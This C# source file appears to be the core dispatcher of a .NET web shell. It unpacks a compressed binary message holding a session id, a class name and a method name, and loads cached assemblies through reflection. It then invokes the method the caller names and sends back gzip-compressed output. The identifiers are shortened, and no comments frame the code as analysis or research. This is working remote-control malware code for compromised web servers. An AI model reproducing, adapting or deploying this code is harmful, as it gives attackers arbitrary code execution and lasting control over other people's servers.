using System;
using System.Collections;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Text;

namespace Nx
{
	internal static class Top
	{
		public static string S(LY h, string key)
		{
			object o = null;
			try
			{
				o = h.vars[key];
			}
			catch (Exception)
			{
			}
			if (o == null)
			{
				return null;
			}
			return Encoding.Default.GetString((byte[])o);
		}

		public static byte[] B(LY h, string key)
		{
			try
			{
				object o = h.vars[key];
				if (o == null)
				{
					return null;
				}
				return (byte[])o;
			}
			catch (Exception)
			{
				return null;
			}
		}

		public static byte[] Tb(string s)
		{
			if (s == null)
			{
				return null;
			}
			return Encoding.Default.GetBytes(s);
		}

		public static string B64e(byte[] d)
		{
			return Convert.ToBase64String(d);
		}

		public static void Run(LY h)
		{
			h.vars = Unpack(h.blob, true);
			string sid = S(h, "sessionId");
			if (sid != null)
			{
				h.ctx = (Hashtable)LY.cache[sid];
			}
			string mth = S(h, "methodName");
			if (mth == null || (h.ctx == null && !"test".Equals(mth)))
			{
				return;
			}
			GZipStream gz = new GZipStream(h.sink, CompressionMode.Compress, true);
			byte[] res = Dsp(h);
			gz.Write(res, 0, res.Length);
			gz.Close();
			gz.Dispose();
			h.vars = null;
			h.blob = null;
			h.ctx = null;
		}

		public static byte[] Dsp(LY h)
		{
			string cls = S(h, "evalClassName");
			string mth = S(h, "methodName");
			if (mth != null)
			{
				try
				{
					object obj = null;
					if (cls != null)
					{
						if (!h.ctx.ContainsKey(cls))
						{
							return Tb("adapter is absent");
						}
						Assembly asm = (Assembly)h.ctx[cls];
						h.vars["sessionTable"] = h.ctx;
						obj = asm.CreateInstance(cls);
						if (obj == null)
						{
							return Tb("type not found: " + cls);
						}
					}
					MethodInfo mi = null;
					bool flag = obj != null;
					Type ty = (flag ? obj.GetType() : typeof(LY));
					obj = (flag ? obj : h);
					byte[] iv = B(h, "invokeMethod");
					object[] arg = new object[1] { h.vars };
					if (iv != null || !flag)
					{
						mi = ty.GetMethod(mth);
						if (mi == null)
						{
							return Tb("no such verb");
						}
						ParameterInfo[] pars = mi.GetParameters();
						if (pars.Length != 0)
						{
							if (pars.Length != 1)
							{
								return Tb("ambiguous signature");
							}
							if (!typeof(Hashtable).IsAssignableFrom(pars[0].ParameterType))
							{
								return Tb("no such verb");
							}
						}
						else
						{
							arg = new object[0];
						}
					}
					h.vars["sessionTable"] = h.ctx;
					object r = null;
					if (mi != null)
					{
						r = mi.Invoke(obj, arg);
					}
					else
					{
						obj.Equals(h.vars);
						string t3 = obj.ToString();
						if (!h.vars.ContainsKey("result"))
						{
							if (t3.Trim().Length > 0)
							{
								return Tb(t3);
							}
							return Tb("empty reply");
						}
						r = h.vars["result"];
					}
					if (r == null)
					{
						return Tb("no return value");
					}
					if (r is string)
					{
						return Tb((string)r);
					}
					if (r is byte[])
					{
						return (byte[])r;
					}
					if (!(r is Hashtable))
					{
						try
						{
							return Tb(r.ToString());
						}
						catch (Exception ex)
						{
							return Tb(ex.Message);
						}
					}
					return Pack((Hashtable)r);
				}
				catch (Exception ex2)
				{
					return Tb(ex2.ToString());
				}
			}
			return Tb("missing verb");
		}

		public static Hashtable Unpack(byte[] data, bool gz)
		{
			Hashtable ht = new Hashtable();
			MemoryStream ms = new MemoryStream(data);
			MemoryStream acc = new MemoryStream();
			string key = null;
			byte[] len = new byte[4];
			try
			{
				Stream s = ms;
				if (gz)
				{
					s = new GZipStream(ms, CompressionMode.Decompress);
				}
				while (true)
				{
					byte c = (byte)s.ReadByte();
					if (c == 1)
					{
						key = Encoding.Default.GetString(acc.ToArray());
						s.Read(len, 0, 4);
						int n = BitConverter.ToInt32(len, 0);
						ht.Add(key, Unpack(ReadN(s, n), false));
						continue;
					}
					if (c == 2)
					{
						key = Encoding.Default.GetString(acc.ToArray());
						s.Read(len, 0, 4);
						int n = BitConverter.ToInt32(len, 0);
						ht.Add(key, ReadN(s, n));
						acc.SetLength(0L);
						continue;
					}
					if (c == 255)
					{
						acc.Dispose();
						ms.Dispose();
						s.Dispose();
						break;
					}
					acc.WriteByte(c);
				}
			}
			catch (Exception)
			{
			}
			return ht;
		}

		private static byte[] ReadN(Stream s, int n)
		{
			byte[] buf = new byte[n];
			int got = 0;
			try
			{
				while ((got += s.Read(buf, got, buf.Length - got)) < buf.Length)
				{
				}
			}
			catch (IOException)
			{
			}
			return buf;
		}

		public static byte[] Pack(Hashtable map)
		{
			MemoryStream ms = new MemoryStream();
			IEnumerator en = map.Keys.GetEnumerator();
			while (en.MoveNext())
			{
				try
				{
					string key = (string)en.Current;
					object val = map[key];
					byte[] kb = Encoding.Default.GetBytes(key);
					ms.Write(kb, 0, kb.Length);
					byte[] vb;
					if (val is byte[])
					{
						ms.WriteByte(2);
						vb = (byte[])val;
					}
					else if (val is Hashtable)
					{
						ms.WriteByte(1);
						vb = Pack((Hashtable)val);
					}
					else
					{
						ms.WriteByte(2);
						vb = (val != null) ? Encoding.Default.GetBytes(val.ToString()) : Encoding.Default.GetBytes("NULL");
					}
					byte[] lb = BitConverter.GetBytes(vb.Length);
					ms.Write(lb, 0, lb.Length);
					ms.Write(vb, 0, vb.Length);
				}
				catch (Exception)
				{
				}
			}
			return ms.ToArray();
		}
	}
}
